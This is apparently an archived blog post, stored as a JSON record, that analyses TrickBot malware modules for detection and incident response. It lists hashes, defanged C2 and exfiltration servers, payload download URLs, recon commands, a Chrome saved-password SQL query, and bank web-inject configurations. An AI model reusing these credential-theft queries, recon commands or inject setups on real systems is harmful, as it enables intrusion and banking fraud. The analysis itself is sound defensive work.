{
    "id": "4972b4d9-4921-4b60-9788-af52d38c3714",
    "created_at": "2023-01-12T15:00:27.598122Z",
    "updated_at": "2025-03-27T02:09:29.735631Z",
    "deleted_at": null,
    "sha1_hash": "9850a8bbaab8ed95fecde146554a684176d713fc",
    "title": "2019-05-22 - TRICKBOT - Analysis",
    "authors": "",
    "file_creation_date": "2022-05-28T15:41:24Z",
    "file_modification_date": "2022-05-28T15:41:24Z",
    "file_size": 3081451,
    "plain_text": "# TRICKBOT - Analysis\n\n**sneakymonkey.net/2019/05/22/trickbot-analysis/**\n\nMark May 22, 2019\n\n#### 22 May 2019 / trickbot TRICKBOT is an info-stealer/banking trojan which is currently under active development and has various modules to grab credentials, move laterally, steal data and provide remote access.\n\n I recently spent sometime walking through this so I've compiled a few tools/techniques out there to decode and analyse each of the TRICKBOT modules - its super simple and very effective! The idea here is to provide awareness, help with detections and aid incident response. I'm no reverse engineer but I get enough done to produce a few IOCs and some basic understanding of it's functionality to scope response. It's all about that context! üòâ\n\n\n-----\n\n#### I can see where a lot of the OSINT reports on TRICKBOT are compiled from now. Another post can be made on the original infection vector, created persistence, removal and other network related IOCs from PCAP data.\n\n## Tooling\n\n#### If you don't already have an active infected host, download the @malware_traffic 2019-04- 27 TRICKBOT SAMPLE üëçüëçüëç Python 2.7 + pip + easy_install pycrypt ‚úî‚úî‚úî @hasherezade TRICKBOT AES config decoder (source) FireEye Labs Obfuscated String Solver (FLOSS) - strings analysis. https://github.com/fireeye/flare-floss CyberChef for extracting URLs/domains/IPs, sorting, filtering, defanging etc.. https://gchq.github.io/CyberChef/#recipe=Extract_URLs(false)Defang_URL(true,true,true,'V alid domains and full URLs')\n\n Once you have those downloaded, its just as easy as follows;\n\n## Steps\n\n#### Ûæ†Æ Run the BOTKEY retrieval on the infected host.\n\n Ûæ†Ø Once you have that, specify and decode.\n```\nconfig_decode.py --botkey {KEY} --datafile\nC:\\Users\\USER\\AppData\\Roaming\\gpuDriver\\Data\\pwgrab64\n\n This will dump the decypted .dll ready for analysis. Do this for each module. Repeat this step for the config files in the module named folders\n\n```\n\n-----\n\n#### via GIPHY\n\n Ûæ†∞ Run through with FLOSS and redirect to an output file if needed floss32.exe\n```\nC:\\Users\\USER\\AppData\\Roaming\\gpuDriver\\Data\\MODULE.dll > MODULE.txt\n\n These are the updated versions I was playing with on my infected host. TRICKBOT Modules 19052019.\n\n Configuration Location:\n   C:\\Users\\*\\AppData\\Roaming\\gpuDriver\\Data\\*\n\n ( %APPDATA%\\gpuDriver\\Data\\ )\n\n## Module SHA256 Hashes\nimportDll64.dll 844974A2D3266E1F9BA275520C0E8A5D176DF69A0CCD5135B99FACF798A5D209\ninjectDll64.dll 8C5C0D27153F60EF8AEC57DEF2F88E3D5F9A7385B5E8B8177BAB55FA7FAC7B18\nmailsearcher64.dll 9CFB441EB5C60AB1C90B58D4878543EE554ADA2CCEEE98D6B867E73490D30FEC\nnetworkDll64.dll BA2A255671D33677CAB8D93531EB25C0B1F1AC3E3085B95365A017463662D787\nNewBCtestDll64.dll BF38A787AEE5AFDCAB00B95CCDF036BC7F91F07151B4444B54165BB70D649CE5\npsfin64.dll 8CD75FA8650EBCF0A6200283E474A081CC0BE57307E54909EE15F4D04621DDE0\npwgrab64.dll 1E90A73793017720C9A020069ED1C87879174C19C3B619E5B78DB8220A63E9B7\nshareDll64.dll 05EF40F7745DB836DE735AC73D6101406E1D9E58C6B5F5322254EB75B98D236A\nsysteminfo64.dll 083CB35A7064AA5589EFC544AC1ED1B04EC0F89F0E60383FCB1B02B63F4117E9\nvncDll64.dll DBD534F2B5739F89E99782563062169289F23AA335639A9552173BEDC98BB834\nwormDll64.dll D5BB8D94B71D475B5EB9BB4235A428563F4104EA49F11EF02C8A08D2E859FD68\n\n String Analysis\n\n```\n\n-----\n\n#### Just to give a rough understanding for each modules output I ve dumped interesting strings. Most of the output seen here matches the OSINT reports I've read. TRICKBOT's core modules at the time of writing;\n\n systeminfo64 networkDll64 psfin64 wormDll64 sharedll64 pwgrab64 injectDll64 importDll64 vncDll64 newBCtestDll64\n\n Also of note: there is the main configuration file at\n```\nC:\\Users\\*\\AppData\\Roaming\\gpuDriver\\Data\\settings.ini but I was unable to decode\n\n via the scripts from hasherade's repo - more reversing/unpacking is needed and will save that for another post. Using Process Hacker to analyse the hollowed out the SVCHOST process memory you can see similar results anyway:\n\n I had previously captured a bigger list upon process start up and saved that which provides more connections (probably downloading the latest config verison?):\n\n```\n\n-----\n\n```\n0x12f6f50 (14): 5[.]190[.]90[.]5:449\n0x1312560 (18): 37[.]255[.]200[.]157:449\n0x1312590 (16): 91[.]98[.]159[.]58:449\n0x13125c0 (18): 190[.]215[.]52[.]165:449\n0x13125f0 (18): 85[.]133[.]183[.]174:449\n0x1312620 (16): 2[.]184[.]90[.]173:449\n0x1312650 (16): 31[.]47[.]55[.]106:449\n0x1312680 (18): 94[.]101[.]182[.]156:449\n0x13126b0 (18): 93[.]115[.]146[.]119:449\n0x13126e0 (17): 201[.]56[.]193[.]18:449\n0x1312710 (18): 177[.]92[.]249[.]187:449\n0x1312740 (18): 187[.]61[.]106[.]223:449\n0x1312770 (18): 187[.]61[.]107[.]140:449\n...\n\n#### See bottom for more IOCs.\n\n Also, analyse Wireshark/PCAP data for the User-Agent it uses when POSTing back data from the infected host.\nPOST /ono1/WINDOWS7_W617601.0CE242D310E5CDC6F2CB8132FBD9B404/83/ HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0;\n.NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0;\nInfoPath.3; .NET4.0C; .NET4.0E)\nHost: 186.159.1.217\n\n Quickly quering those C2 addresses, most seem to have a commonality of MikroTik based devices - either that or Shodan is misrepresenting that port. Further digging can be done later on this.\nPorts:\n   21/tcp MikroTik router ftpd (6.43.2)\n  2000/tcp MikroTik bandwidth-test server\n  8080/tcp MikroTik http proxy\nPorts:\n   21/tcp MikroTik router ftpd (6.42.5)\n  2000/tcp MikroTik bandwidth-test server\n  8080/tcp MikroTik http proxy\nPorts:\n  2000/tcp MikroTik bandwidth-test server\nPorts:\n   21/tcp MikroTik router ftpd (6.43.12)\n  2000/tcp MikroTik bandwidth-test server\n  8080/tcp MikroTik http proxy\nPorts:\n   21/tcp MikroTik router ftpd (6.40.4)\n  2000/tcp MikroTik bandwidth-test server\n\n Back to the string analysis of the TRICKBOT modules...\n\n## systeminfo64\n\n```\n\n-----\n\n#### Basic information on the host. Noticed the registry key lookup to gather installed applications aswell as WMI queries.\n```\nSELECT * FROM Win32_OperatingSystem\nSELECT * FROM Win32_Processor\nSELECT * FROM Win32_ComputerSystem\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\nu\"SELECT * FROM Win32_OperatingSystem\"\nu\"CSDVersion\"\nu\"SELECT * FROM Win32_Processor\"\nu\"<cpu>%s</cpu>\\r\\n\"\nu\"SELECT * FROM Win32_ComputerSystem\"\nu\"<ram>%s</ram>\\r\\n\"\nu\"<users>\\r\\n\"\nu\"<user>%s</user>\\r\\n\"\nu\"</users>\\r\\n\"\nu\"DisplayName\"\nu\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\"\nu\"<installed>\\r\\n\"\nu\"DisplayName\"\nu\"<program>%s</program>\\r\\n\"\nu\"</installed>\\r\\n\"\nu\"DisplayName\"\nu\"DisplayName\"\nu\"<service>%s</service>\\r\\n\"\n\n## networkDll64\n\n#### Gathers system information and network/domain topology - you can see what is being leaked. Seems to be enumerating or looking for Administrative accounts which is all then reported back to the C2.\n\n```\n\n-----\n\n```\n  SYSTEMINFO\nROOT\\CIMV2 SELECT * FROM Win32_OperatingSystem\nCSName\nCaption\nCSDVersion\nOSArchitecture\nProductType\nBuildType\nWindowsDirectory\nSystemDirectory\nBootDevice\nSerialNumber\nInstallDate\nLastBootUpTime\nRegisteredUser\nOrganization\nTotalVisibleMemorySize\nFreePhysicalMemory\nHost Name - %s\nOS Name - %s\nOS Version - %s\nOS Architecture - %s\nProduct Type - Workstation\nProduct Type - Domain Controller\nProduct Type - Server\nBuild Type - %s\nRegistered Owner - %s\nRegistered Organization - %s\nSerial Number - %s\nInstall Date - %02u/%02u/%04u %02d.%02d.%02d\nLast Boot Up Time - %02u/%02u/%04u %02d.%02d.%02d\nWindows Directory - %s\nSystem Directory - %s\nBoot Device - %s\nTotal Physical Memory - %d Mb\nAvailable Physical Memory - %d Mb\n    ***PROCESS LIST***\n{001677D0-FD16-11CE-ABC4-02608C9E7553}\n{00020404-0000-0000-C000-000000000046}\n{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}\ndNSHostName\ndescription\nsAMAccountName\nmail\ncomment\nE-mail: %s\n(&(objectcategory=person)(samaccountname=%s))\nAdmin Name: %s\nAdmin E-mail: %s\n(&(objectcategory=person)(mail=*))\n(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))\nList of domains:\nLDAP://%s\nAdministrator\nAdministrateur\nRiarth\nAmministratore\n\n```\n\n-----\n\n```\nAdminisztr\nAdministr\nrnandi\nAdministrators\nAdministratorius\nHallintomies\nAdministrat\nAdministraator\nAdministrador\nnetici\n          ***LOCAL MACHINE DATA***\nUser name: %s\nComputer name: %s\nSite name: %s\nDomain shortname: %s\nDomain name: %s\nForest name: %s\nDomain controller: %s\nForest trees:\n     %d %s\n/%s/%s/90\nContent-Type: multipart/form-data; boundary=%s\ntest\nPOST\n--%s\nContent-Disposition: form-data; name=\"proclist\"\n--%s\nContent-Disposition: form-data; name=\"sysinfo\"\n--%s-<moduleconfig><needinfo name=\"id\"/><needinfo name=\"ip\"/><autoconf><conf ctl=\"SetConf\"\nfile=\"dpost\" period=\"1440\"/></autoconf></moduleconfig>\n\\cmd.exe\n          %s\nSendReport\nReport successfully sent\nDpost servers unavailable\n/c ipconfig /all\n/c net config workstation\n/c net view /all\n/c net view /all /domain\n/c nltest /domain_trusts\n/c nltest /domain_trusts /all_trusts\n\n#### Decoded 'dpost' config C:\\Users*\\AppData\\Roaming\\gpuDriver\\Data\\networkDll64_configs\n\n```\n\n-----\n\n```\n dpost \n<handler>hxxp[://]75[.]183[.]130[.]158:8082</handler>\n<handler>hxxp[://]186[.]10[.]243[.]70:8082</handler>\n<handler>hxxp[://]75[.]183[.]130[.]158:8082</handler>\n<handler>hxxp[://]186[.]183[.]151[.]194:8082</handler>\n<handler>hxxp[://]181[.]129[.]160[.]10:8082</handler>\n<handler>hxxp[://]181[.]115[.]156[.]218:80</handler>\n<handler>hxxp[://]200[.]21[.]51[.]30:80</handler>\n<handler>hxxp[://]36[.]91[.]93[.]114:80</handler>\n<handler>hxxp[://]97[.]87[.]127[.]198:80</handler>\n<handler>hxxp[://]190[.]152[.]125[.]162:80</handler>\n<handler>hxxp[://]185[.]117[.]73[.]140:443</handler>\n<handler>hxxp[://]185[.]183[.]97[.]37:443</handler>\n<handler>hxxp[://]85[.]209[.]162[.]148:443</handler>\n<handler>hxxp[://]192[.]210[.]152[.]190:443</handler>\n<handler>hxxp[://]185[.]183[.]96[.]219:443</handler>\n<handler>hxxp[://]185[.]244[.]150[.]148:443</handler>\n</dpost>\n\n## psfin64\n\n#### Point-of-Sale 'recon' module. These are high end targets to steal financial details from, think tills, kiosks, payment terminals. Pro-actively finding and securing these in your environment could help prevent further damage - patch, use unique local Administrative credentials, segregate (VLAN/FW), disabled ADMIN$ shares etc. You can see the keyword searches via LDAP/AD.\n\n```\n\n-----\n\n```\n moduleconfig needinfo name \\ id\\ / needinfo name \\ ip\\ / autoconf conf\nctl=\\\"SetConf\\\" file=\\\"dpost\\\" period=\\\"14400\\\"/></autoconf></moduleconfig>\"\nu\"{001677D0-FD16-11CE-ABC4-02608C9E7553}\"\nu\"{00020404-0000-0000-C000-000000000046}\"\nu\"{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}\"\nu\"(&(objectCategory=computer)(dNSHostName=%s))\"\nu\"(&(objectCategory=person)(sAMAccountName=%s))\"\nu\"(&(objectCategory=group)(sAMAccountName=%s))\"\nu\"(&(objectCategory=site)(name=%s))\"\nu\"(&(objectcategory=organizationalUnit)(name=%s))\"\nu\"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))\"\nu\"DOMAIN GC\\r\\n\"\nu\"---------------------------------------------------------------\\r\\n\"\nu\"COMPUTERS:\\r\\n\"\nu\"*POS*\"\nu\"POS found: %d\\r\\n\"\nu\"*REG*\"\nu\"REG found: %d\\r\\n\"\nu\"*CASH*\"\nu\"CASH found: %d\\r\\n\"\nu\"*LANE*\"\nu\"LANE found: %d\\r\\n\"\nu\"*STORE*\"\nu\"STORE found: %d\\r\\n\"\nu\"*RETAIL*\"\nu\"RETAIL found: %d\\r\\n\"\nu\"*BOH*\"\nu\"BOH found: %d\\r\\n\"\nu\"*ALOHA*\"\nu\"ALOHA found: %d\\r\\n\"\nu\"*MICROS*\"\nu\"MICROS found: %d\\r\\n\"\nu\"*TERM*\"\nu\"TERM found: %d\\r\\n\\r\\n\"\nu\"USERS:\\r\\n\"\nu\"GROUPS:\\r\\n\"\nu\"SITES:\\r\\n\"\nu\"OUs:\\r\\n\"\nu\"---------------------------------------------------------------\\r\\n\\r\\n\"\nu\"dNSHostName\"\nu\"LDAP://%s\"\nu\"DOMAIN %s\\r\\n\" \nu\"/%s/%s/90\"\nu\"Content-Type: multipart/form-data; boundary=%s\"\n\"SendReport\"\n\"Report successfully sent\"\n\"Dpost servers unavailable\"\nu\"--%s\\r\\nContent-Disposition: form-data; name=\\\"proclist\\\"\\r\\n\\r\\n\"\nu\"Empty\\r\\n\"\nu\"--%s\\r\\n\"\nu\"Content-Disposition: form-data; name=\\\"sysinfo\\\"\\r\\n\\r\\n\"\nu\"--%s--\\r\\n\\r\\n\"\n\n#### Decoded 'dpost' config C:\\Users*\\AppData\\Roaming\\gpuDriver\\Data\\psfin64_configs\n\n```\n\n-----\n\n```\n dpost \n<handler>hxxp[://]75[.]183[.]130[.]158:8082</handler>\n<handler>hxxp[://]186[.]10[.]243[.]70:8082</handler>\n<handler>hxxp[://]75[.]183[.]130[.]158:8082</handler>\n<handler>hxxp[://]186[.]183[.]151[.]194:8082</handler>\n<handler>hxxp[://]181[.]129[.]160[.]10:8082</handler>\n<handler>hxxp[://]181[.]115[.]156[.]218:80</handler>\n<handler>hxxp[://]200[.]21[.]51[.]30:80</handler>\n<handler>hxxp[://]36[.]91[.]93[.]114:80</handler>\n<handler>hxxp[://]97[.]87[.]127[.]198:80</handler>\n<handler>hxxp[://]190[.]152[.]125[.]162:80</handler>\n<handler>hxxp[://]185[.]117[.]73[.]140:443</handler>\n<handler>hxxp[://]185[.]183[.]97[.]37:443</handler>\n<handler>hxxp[://]85[.]209[.]162[.]148:443</handler>\n<handler>hxxp[://]192[.]210[.]152[.]190:443</handler>\n<handler>hxxp[://]185[.]183[.]96[.]219:443</handler>\n<handler>hxxp[://]185[.]244[.]150[.]148:443</handler>\n</dpost>\n\n## wormDll64\n\n#### Downloads a .png (.exe) from hxxp://54.38.127[.]23/worming.png the TRICKBOT loader to prep for lateral movement. Also, checks to see if the host is in a domain or not by using LDAP queries. Seems to use lateral movment via shares T1077 using pysmb library.\n\n pysmb is an experimental SMB/CIFS library written in Python. It implements the client-side SMB/CIFS protocol (SMB1 and SMB2) which allows your Python application to access and transfer files to/from SMB/CIFS shared folders like your Windows file sharing and Samba folders.\n\n hxxp://54.38.127[.]23/worming.png\n clnProekto.exe\n 74E6723E9DC7126D4864DCBC41C6B5DAB7AD2A9F56D0C0F94593BA88BDCA1D58\n https://urlhaus.abuse.ch/url/198254/\n\n```\n\n-----\n\n```\nhxxp://54.38.127[.]23/worming.png\n{001677D0-FD16-11CE-ABC4-02608C9E7553}\n{00020404-0000-0000-C000-000000000046}\n{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}\nname\n(objectCategory=computer)\ndNSHostName\n(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))\n          *****MACHINE IN DOMAIN*****\nLDAP://%ls\n          *****MACHINE IN WORKGROUP*****\nSMBs\npysmb\nSMBr\nNT LM 0.12\nSMBt\nSMBs\nSMBs\nWindows 7\n2008\nVista\nWindows 5\n2003\n\\\\%s\\IPC$\n\n## shareDll64\n\n#### Downloads the TRICKBOT loader, transfers over to ADMIN shares and creates persistence via services using a naming convention from the list \"ControlInfoService\" etc - needs confirming. Also note the 'WormShare' function name.\n\n Other OSINT analysis:\n\n This module appears to be meant to be used in tandem with the worm32Dll module to spread Trickbot across local networks and shares via ETERNALBLUE SMB exploit and LDAP queries. Creates a service with one of the names from the quoted list. The Admin$ shares are used by Trickbot once it has brute forced the local administrator password. A file share server has an IPC$ share that Trickbot queries to get a list of all endpoints that connect to it.\n\n hxxp://54.38.127[.]23/radiance.png\n escaped.exe\n 5E2CEFB701B743818728ABEDE5FED4956E3ADB69BF58A56C19F5118C415A93BC\n\n```\n\n-----\n\n```\ncreate service?\nOpen sc %d\nStart sc 0x%x\nCreate sc 0x%x\nhxxp://54.38.127[.]23/radiance.png\n%s\\C$\\escaped.exe\nControlInfoService \n%SystemRoot%\\system32\\escaped.exe\n%SystemDrive%\\escaped.exe\n%ADMIN$\\escaped.exe\nWormShare\n%\\IPC$\n%SystemDrive%\\escaped.exe\nWantRelease\n54.38.127.23\nfile.inf\n\"ControlInfoService\"\n\"ControlSystemInfoService\"\n\"ServiceInfoSys\"\n\"TechnoInfoService\"\n\"AdvancedInfoService\"\n\"ServiceInfo\"\n\"InfoService\"\n\"ServiceInfoControl\"\n\n## pwgrab64\n\n#### Grabs passwords from various spots, seen here querying Chrome/IE password storage. OSINT reports suggest RDP (CredEnumerateA API ref), VNC and Putty.\nSoftware\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2\n<moduleconfig><autostart>yes</autostart><all>yes</all><needinfo name=\"id\"/><needinfo\nname=\"ip\"/><autoconf><conf ctl=\"dpost\" file=\"dpost\" period=\"60\"/></autoconf>\n</moduleconfig>\nChrome login db should be copied\nChrome webdata db should be copied\nChrome login db should be copied (copy absent)\nChrome webdata db should be copied (copy absent)\nChrome login db copied\nChrome webdata db copied\nChrome login db copy failure\nChrome webdata db copy failure\nSkip Chrome login db copy\nSkip Chrome history db copy\nGrab_Passwords_Chrome(0)\nGrab_Passwords_Chrome(1)\nGrab_Passwords_Chrome(2)\n\\Google\\Chrome\\User Data\\Default\\Login Data.bak\nGrab_Passwords_Chrome(): Can't open database\nselect origin_url, username_value, password_value, length(password_value) from logins\nwhere blacklisted_by_user = 0\nGrab_Passwords_Chrome() success\n\n decoded dpost config C:\\Users*\\AppData\\Roaming\\gpuDriver\\Data\\pwgrab64_configs\n\n```\n\n-----\n\n```\n dpost \n<handler>hxxp[://]186[.]159[.]1[.]217:8082</handler>\n<handler>hxxp[://]186[.]10[.]243[.]70:8082</handler>\n<handler>hxxp[://]75[.]183[.]130[.]158:8082</handler>\n<handler>hxxp[://]186[.]183[.]151[.]194:8082</handler>\n<handler>hxxp[://]181[.]129[.]160[.]10:8082</handler>\n<handler>hxxp[://]181[.]57[.]97[.]138:80</handler>\n<handler>hxxp[://]200[.]21[.]51[.]30:80</handler>\n<handler>hxxp[://]191[.]103[.]252[.]29:80</handler>\n<handler>hxxp[://]200[.]35[.]47[.]199:80</handler>\n<handler>hxxp[://]190[.]152[.]125[.]162:80</handler>\n<handler>hxxp[://]79[.]137[.]119[.]209:443</handler>\n<handler>hxxp[://]216[.]189[.]145[.]231:443</handler>\n<handler>hxxp[://]194[.]5[.]250[.]130:443</handler>\n<handler>hxxp[://]192[.]210[.]152[.]190:443</handler>\n<handler>hxxp[://]195[.]123[.]240[.]31:443</handler>\n<handler>hxxp[://]89[.]46[.]223[.]252:443</handler>\n</dpost>\n\n## injectDll64\n\n#### Used for injecting into banking websites to steal credentials. Notice how it weakens Chrome Browser via\n\n```\n```\nSoftware\\Policies\\Google\\Chrome\\CertificateTransparencyEnforcementDisabledForUrls\n\n```\n\n#### Disables enforcing Certificate Transparency requirements to the listed URLs. This policy allows certificates for the hostnames in the specified URLs to not be disclosed via Certificate Transparency. This allows certificates that would otherwise be untrusted, because they were not properly publicly disclosed, to continue to be used, but makes it harder to detect misissued certificates for those hosts.\n\n CertificateTransparencyEnforcementDisabledForUrls\n You can see this is the main module and purpose of TRICKBOT (steal credentials/data) so this is made up of more configuration files then any other module.\n\n 1. DINJ config is used for ATTACK 1 - Web Injects - Server Side Injections. A web injection\n technique which inserts (injects) additional client-side code (e.g. HTML, JavaScript) in the rendered targeted web page. 2. SINJ config is used for ATTACK 2 - Web Injects - Web Fakes. The user is redirected to a\n similiar looking site hosted on the attackers infrastructure. 3. DPOST - Data exfiltration IPs.\n ref: https://www.cisecurity.org/white-papers/security-primer-trickbot/ üëè\n\n\n-----\n\n```\n moduleconfig \n <sys>yes</sys>\n <needinfo name=\"id\"/>\n <needinfo name=\"ip\"/>\n <autoconf>\n  <conf ctl=\"dinj\" file=\"dinj\" period=\"20\"/>\n  <conf ctl=\"sinj\" file=\"sinj\" period=\"20\"/>\n  <conf ctl=\"dpost\" file=\"dpost\" period=\"60\"/>\n </autoconf>\n</moduleconfig>\nascii,81,-,x,Software\\Policies\\Google\\Chrome\\CertificateTransparencyEnforcementDisabledFor\nascii,81,-,x,Software\\Policies\\Google\\Chrome\\CertificateTransparencyEnforcementDisabledFor\nascii,81,-,x,Software\\Policies\\Google\\Chrome\\CertificateTransparencyEnforcementDisabledFor\n\n#### Decoded configs C:\\Users*\\AppData\\Roaming\\gpuDriver\\Data\\injectDll64_configs\\dpost\n<dpost>\n<handler>hxxp[://]186[.]159[.]1[.]217:8082</handler>\n<handler>hxxp[://]186[.]10[.]243[.]70:8082</handler>\n<handler>hxxp[://]75[.]183[.]130[.]158:8082</handler>\n<handler>hxxp[://]186[.]183[.]151[.]194:8082</handler>\n<handler>hxxp[://]181[.]129[.]160[.]10:8082</handler>\n<handler>hxxp[://]181[.]57[.]97[.]138:80</handler>\n<handler>hxxp[://]200[.]21[.]51[.]30:80</handler>\n<handler>hxxp[://]191[.]103[.]252[.]29:80</handler>\n<handler>hxxp[://]200[.]35[.]47[.]199:80</handler>\n<handler>hxxp[://]190[.]152[.]125[.]162:80</handler>\n<handler>hxxp[://]79[.]137[.]119[.]209:443</handler>\n<handler>hxxp[://]216[.]189[.]145[.]231:443</handler>\n<handler>hxxp[://]194[.]5[.]250[.]130:443</handler>\n<handler>hxxp[://]192[.]210[.]152[.]190:443</handler>\n<handler>hxxp[://]195[.]123[.]240[.]31:443</handler>\n<handler>hxxp[://]89[.]46[.]223[.]252:443</handler>\n</dpost>\n\n C:\\Users*\\AppData\\Roaming\\gpuDriver\\Data\\injectDll64_configs\\sinj snippet\n\n```\n\n-----\n\n```\n sinj \n<mm>hxxps[://]www[.]rbsdigital[.]com*</mm>\n<sm>hxxps[://]www[.]rbsdigital[.]com/default[.]aspx*</sm>\n<nh>cksaynvgcustplhbkjzrdfxaqiom[.]net</nh>\n<url404></url404>\n<srv>198.46.190.28:443</srv>\n</sinj>\n<sinj>\n<mm>hxxps[://]www[.]nwolb[.]com*</mm>\n<sm>hxxps[://]www[.]nwolb[.]com/default[.]aspx*</sm>\n<nh>cqsawlqdxvfyrcbostmkjeuagpzi[.]net</nh>\n<url404></url404>\n<srv>198.46.190.28:443</srv>\n</sinj>\n<sinj>\n<mm>hxxps[://]retail[.]santander[.]co[.]uk*</mm>\n<sm>hxxps[://]retail[.]santander[.]co[.]uk/LOGSUK_NS_ENS/BtoChannelDriver[.]ssobto*</sm>\n<nh>odsakrjtsmyalzxfdpvbgqieowch[.]com</nh>\n<url404></url404>\n<srv>198.46.190.28:443</srv>\n</sinj>\n<sinj>\n...\n...\n...\n...\n\n#### C:\\Users*\\AppData\\Roaming\\gpuDriver\\Data\\injectDll64_configs\\dinj snippet\n\n```\n\n-----\n\n```\n igroup \n<dinj>\n<lm>*.com/SPF/Login/Auth[.]aspx*</lm>\n<hl>hxxp[://]185[.]202[.]174[.]13/response[.]php</hl>\n<pri>100</pri>\n<sq>2</sq>\n<ignore_mask>*.gif*</ignore_mask>\n<ignore_mask>*.jpg*</ignore_mask>\n<ignore_mask>*.png*</ignore_mask>\n<ignore_mask>*.js*</ignore_mask>\n<ignore_mask>*.css*</ignore_mask>\n<require_header>*text/html*</require_header>\n</dinj>\n<dinj>\n<lm>*.com/SPF/Login/favicon[.]ico?*</lm>\n<hl>hxxp[://]185[.]202[.]174[.]13/response[.]php</hl>\n<pri>100</pri>\n<sq>2</sq>\n</dinj>\n<dinj>\n<lm>*favicon[.]ico=f7caf50483938302d86aa228d161e435*</lm>\n<hl>hxxp[://]185[.]202[.]174[.]13/response[.]php</hl>\n<pri>100</pri>\n<sq>1</sq>\n</dinj>\n</igroup>\n<dinj>\n<lm>*amazon.*</lm>\n<hl>hxxps[://]185[.]202[.]174[.]13:446/response[.]php?\ns=1527163537124692&id=DeJENQHkNQsIpSv5YWb8</hl>\n<pri>100</pri>\n<sq>2</sq>\n<ignore_mask>hxxps[://]www[.]amazon[.]co[.]uk/ap/signin</ignore_mask>\n<ignore_mask>hxxps[://]www[.]amazon[.]co[.]uk/*</ignore_mask>\n<ignore_mask>hxxps[://]www[.]amazon[.]co[.]uk/gp/yourstore/home*</ignore_mask>\n<ignore_mask>hxxps[://]sellercentral[.]amazon[.]com/ap/signin*</ignore_mask>\n<ignore_mask>hxxps[://]sellercentral[.]amazon[.]com/gp/notifications/notification-widgetinternals[.]html*</ignore_mask>\n<ignore_mask>*popokai[.]com*</ignore_mask>\n<ignore_mask>*.js*</ignore_mask>\n<ignore_mask>hxxps[://]www[.]amazon[.]de/ap/signin</ignore_mask>\n<ignore_mask>hxxps[://]www[.]amazon[.]ca/ap/signin</ignore_mask>\n<ignore_mask>hxxps[://]www[.]amazon[.]de/gp/yourstore/home*</ignore_mask>\n<ignore_mask>hxxps[://]www[.]amazon[.]ca/gp/yourstore/home*</ignore_mask>\n<ignore_mask>hxxps[://]www[.]amazon[.]ca/*</ignore_mask>\n<ignore_mask>hxxps[://]www[.]amazon[.]de/*</ignore_mask>\n<require_header>*text/html*</require_header>\n</dinj>\n<dinj>\n<lm>hxxps[://]www[.]amazon[.]co[.]uk/ap/signin</lm>\n<hl>hxxps[://]185[.]202[.]174[.]13:446/response[.]php?\ns=1527163537124692&id=sL5FRia9p0kAxzAm7uXQ</hl>\n<pri>100</pri>\n<sq>2</sq>\n<ignore_mask>*popokai[.]com*</ignore_mask>\n</dinj>\n...\n\n```\n\n-----\n\n```\n...\n...\n\n#### dinj and sinj are made up of a dozen more banking websites and shopping sites such as Amazon.\n\n## importDll64\n\n#### Browser artefact grabber, form-data, cookies, history. Profiles the installed browser/s via an html/jscript https://gist.github.com/sneakymonk3y/4c372ec9b6b90e445c81de7d9ecaffd9\n\n```\n\n-----\n\n```\n!! ##$$%%&& (()),, ..//00112233445566778899SQLite format 3\nSQLITE_\n2017-02-13 16:02:40 ada05cfa86ad7f5645450ac7a2a21c9aa6e57d2c\nLooking for %s\n%s not found\nBrowser exec is: %s\n as \nconf.name\nconf.grabbed\nGetting cookies\nattempt %d. Cookies not found\nGetting html5 local storage\nattempt %d. Local Storage not found\nGetting browser history\nattempt %d. History not found\nGetting flash lso files\nbasic_string::_M_construct null not valid\nInternetExplorer\nunsupported OS\nSOFTWARE\\Microsoft\\Internet Explorer\\svcVersion\nSOFTWARE\\Microsoft\\Internet Explorer\\Version\nregistry access\nFound version %s\nVersion %d is not supported\n/internet explorer/iexplore.exe \nbasic_string::_M_construct null not valid\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Cookies\nregistry cookies path\nHTTP/1.1 200 OK\nServer: grabber\nIE compatible mode grabbing...\nHave a nice day\nerror listenning\nTrying browser communication... please wait\nmagic %d\nHiddenDesktop\n{URL}\nhttp.userAgent\nSuccess\nCould not gather browser data\nCompatible mode grabbing is not finished!\n127.0.0.1\n[email protected]\nhttp://127.0.0.1\nhttp://www.phreedom.org/md5)\nhttp://bugreports.qt.io/\nhttp://www.openssl.org/support/faq.html\nhttp://www.w3.org/XML/1998/namespace\nhttp://www.w3.org/2000/xmlns/\nhttp://gcc.gnu.org/bugs.html):\nC:\\temp\\qt-common\nC:\\temp\\qt-user\nc:\\users\\root\\appdata\\local\\microsoft\\windows\\webcache\\webcachev01.dat\n\n## vncDll64\n\n```\n\n-----\n\n#### Remote Control - VNC module. Could be similar tooling such as http://vncproxy.sourceforge.net/proxy.html. Outlook is being referenced - not sure if this is more a screen grabbing module for reading emails/security codes?\n\n\n-----\n\n```\n185.172.129[.]11\nRSDS/\nC:\\Users\\MaxMikhaylov\\Documents\\Visual Studio\n2010\\MMVNC.PROXY\\VNCSRV\\x64\\Release\\VNCSRV.pdb\nvncsrv.dll\n\"WinSta0\\\\AlterDesk01\"\n\" -new -noframemerging http://www.google.com\"\n\"Chrome_WidgetWin\"\n\" --allow-no-sandbox-job --no-sandbox --disable-3d-apis --disable-accelerated-layers -disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disableaccelerated-2d-canvas\"\n\"MozillaWindowClass\"\n\" -safe-mode\"\n\" taskschd.msc\"\n\" /K schtasks.exe 